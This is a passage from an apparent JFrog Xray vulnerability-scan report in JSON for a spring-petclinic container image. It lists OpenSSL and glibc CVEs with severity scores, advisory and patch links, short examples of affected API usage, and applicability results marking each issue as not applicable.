                  "Description": "The attackers must find a remote input that propagates to the `OBJ_obj2txt()` function.\nIn OpenSSL 3.x, the vulnerable function `OBJ_obj2txt()` is used internally in a lot of cryptographic algorithms that do not limit the Object Identifier size in `ASN.1` packets.\nIn OpenSSL 1.x, it is applicable only when using the `OBJ_obj2txt()` function directly- which is highly unlikely for a server application.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Although the issue is properly explained and creating a large Object Identifier looks trivial - a PoC is not available and requires a solid understanding of `ASN.1` and its structure.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20230530.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=db779b0e10b047f2585615e0b8f2acdf21f8544a",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-2650",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable functions of OpenSSL are not called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-2650",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-520915",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-2650",
                     "cwe": [
                        "CWE-770"
                     ],
                     "cwe_details": {
                        "CWE-770": {
                           "name": "Allocation of Resources Without Limits or Throttling",
                           "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-520915",
            "VulnerabilityTitle": "",
            "ShortDescription": "Insufficient input validation in OpenSSL may lead to denial of service when processing crafted ASN.1 input.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nAn `Object Identifier (OID)` is represented as a series of sub-identifiers, which are numbers separated by periods. These sub-identifiers form a hierarchical structure, allowing for the unique identification of objects, algorithms, or protocols. For example, the OID \"1.2.840.10045.2.1\" represents the Elliptic Curve Digital Signature Algorithm (ECDSA) in decimal form.\n\nThe function `OBJ_obj2txt()` in OpenSSL allows the translation of an `ASN.1 Object Identifier` into its canonical numeric text form. This canonical form represents the sub-identifiers of the Object Identifier in decimal form, with each sub-identifier separated by periods.\n\nAn issue in this function has been discovered: the number of sub-identifiers is not limited. As the computing time of the translation is quadratic, an attacker-controlled Object identifier can craft a large one with a big sub-identifier and may cause a denial of service.\n\nWith OpenSSL 3.x, support to fetch cryptographic algorithms using names/identifiers in a String form was introduced. This includes using Object Identifiers in canonical numeric text form as identifiers for fetching algorithms.\n\nFor OpenSSL 3.x, `OCSP, PKCS7/SMIME, CMS, CMP/CRMF, or TS` are vulnerable but not `TLS` (100KiB limit on the peer's certificate chain) except if it has `client_authentication` enabled.\n\nExample of vulnerable code:\n```c\n    basic_resp = d2i_OCSP_BASICRESP_bio(bio, NULL);\n    if (!basic_resp) {\n        printf(\"Error parsing OCSP response\\n\");\n        return 1;\n    }\n\n    // Load the certificate to verify against\n    cert = X509_new();\n    if (!cert) {\n        printf(\"Error creating X509 certificate object\\n\");\n        return 1;\n    }\n\n    if (!X509_load_cert_file(cert, \"certificate.pem\")) {\n        printf(\"Error loading certificate\\n\");\n        return 1;\n    }\n\n    // Verify the OCSP response\n    int status = OCSP_basic_verify(basic_resp, cert, NULL, 0);\n    if (status == 1) {\n        printf(\"OCSP response is valid\\n\");\n    } else {\n        printf(\"OCSP response verification failed\\n\");\n    }\n```\nThe function `OCSP_basic_verify()` is calling indirectly the vulnerable `OBJ_obj2txt()` function and is processing an external response that can be used by an attacker to trigger the issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The issue can be triggered by a crafted request.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attackers must find a remote input that propagates to the `OBJ_obj2txt()` function.\nIn OpenSSL 3.x, the vulnerable function `OBJ_obj2txt()` is used internally in a lot of cryptographic algorithms that do not limit the Object Identifier size in `ASN.1` packets.\nIn OpenSSL 1.x, it is applicable only when using the `OBJ_obj2txt()` function directly- which is highly unlikely for a server application.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Although the issue is properly explained and creating a large Object Identifier looks trivial - a PoC is not available and requires a solid understanding of `ASN.1` and its structure.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20230530.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=db779b0e10b047f2585615e0b8f2acdf21f8544a",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-2650",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable functions of OpenSSL are not called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-2650",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-230390",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2097",
                     "cwe": [
                        "CWE-327"
                     ],
                     "cwe_details": {
                        "CWE-327": {
                           "name": "Use of a Broken or Risky Cryptographic Algorithm",
                           "description": "The product uses a broken or risky cryptographic algorithm or protocol."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-230390",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper implementation of the AES encryption in OpenSSL may cause data leakage.",
            "FullDescription": "[`OpenSSL's`](https://openssl.org) implementation for `Advanced Encryption Standard (AES)` in `Offset CodeBook mode (OCB)` used for block ciphers may neglect to encrypt some of the data. This issue only affects 32bit x86 platforms, and could result in either exposing 16 bytes of preexisting data in the program's memory, or 16 bytes of plaintext when performing \"in place\" encryption.\n\nTLS and DTLS are not affected, since OpenSSL doesn't support OCB based cipher suites for these communication methods.\n\nA program is vulnerable if it uses any of the AES OCB encryption methods, `EVP_aes_128_ocb`, `EVP_aes_192_ocb` or `EVP_aes_256_ocb`, when EVP encryption is initialized. For instance:\n\n```\nEVP_EncryptInit_ex(ctx, EVP_aes_256_ocb(), NULL, key, iv);\nEVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);\n```",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Use of OCB mode is uncommon and does not affect TLS and DTLS",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "This vulnerability only applies to 32bit x86 platforms using in-place AES encryption in OCB mode",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "Data that should have been encrypted will be exposed in the case of \"in place\" encryption, whereas in other cases unknown preexisting data from the memory may be exposed",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220705.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-2097",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function EVP_EncryptInit_ex is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-2097",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-230390",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2097",
                     "cwe": [
                        "CWE-327"
                     ],
                     "cwe_details": {
                        "CWE-327": {
                           "name": "Use of a Broken or Risky Cryptographic Algorithm",
                           "description": "The product uses a broken or risky cryptographic algorithm or protocol."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-230390",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper implementation of the AES encryption in OpenSSL may cause data leakage.",
            "FullDescription": "[`OpenSSL's`](https://openssl.org) implementation for `Advanced Encryption Standard (AES)` in `Offset CodeBook mode (OCB)` used for block ciphers may neglect to encrypt some of the data. This issue only affects 32bit x86 platforms, and could result in either exposing 16 bytes of preexisting data in the program's memory, or 16 bytes of plaintext when performing \"in place\" encryption.\n\nTLS and DTLS are not affected, since OpenSSL doesn't support OCB based cipher suites for these communication methods.\n\nA program is vulnerable if it uses any of the AES OCB encryption methods, `EVP_aes_128_ocb`, `EVP_aes_192_ocb` or `EVP_aes_256_ocb`, when EVP encryption is initialized. For instance:\n\n```\nEVP_EncryptInit_ex(ctx, EVP_aes_256_ocb(), NULL, key, iv);\nEVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);\n```",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Use of OCB mode is uncommon and does not affect TLS and DTLS",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "This vulnerability only applies to 32bit x86 platforms using in-place AES encryption in OCB mode",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "Data that should have been encrypted will be exposed in the case of \"in place\" encryption, whereas in other cases unknown preexisting data from the memory may be exposed",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220705.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-2097",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function EVP_EncryptInit_ex is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-2097",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-531741",
         "severity": "Medium",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in glibc. In an uncommon situation, the gaih_inet function may use memory that has been freed, resulting in an application crash. This issue is only exploitable when the getaddrinfo function is called and the hosts database in /etc/nsswitch.conf is configured with SUCCESS=continue or SUCCESS=merge.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4813",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A flaw was found in glibc. In an uncommon situation, the gaih_inet function may use memory that has been freed, resulting in an application crash. This issue is only exploitable when the getaddrinfo function is called and the hosts database in /etc/nsswitch.conf is configured with SUCCESS=continue or SUCCESS=merge.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-531741",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free vulnerability in the `getaddrinfo` function of glibc may lead to denial of service when a non-default nsswitch.conf file is used.",
            "FullDescription": "",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Deployment mitigations\n\nIn `nsswitch.conf`, remove any `success=continue` and  `success=merge` directives under the `hosts` line",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "The vulnerability is only exploitable when `getaddrinfo` is called",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The vulnerability is only exploitable if a **non-default** `nsswitch.conf` file is used, where one of the following lines is present -\n* `hosts: ... success=continue...`\n* `hosts: ... success=merge ...`",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Exploitation requires triggering a use-after-free beyond the scope of a single function. The use-after-free has not been proven to be able to cause code execution.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "CVSS does not reflect the prerequisites for applicability.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Published GitHub advisory",
                  "Url": "https://github.com/advisories/GHSA-qx6j-g797-jg9r",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Commit 1c37b80 patched this.",
                  "Url": "https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=1c37b8022e8763fedbb3f79c02e05c6acfe5a215",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2023-4813",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The hosts key configuration in nsswitch.conf is not vulnerable.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2023-4813",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-531741",
         "severity": "Medium",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in glibc. In an uncommon situation, the gaih_inet function may use memory that has been freed, resulting in an application crash. This issue is only exploitable when the getaddrinfo function is called and the hosts database in /etc/nsswitch.conf is configured with SUCCESS=continue or SUCCESS=merge.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4813",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
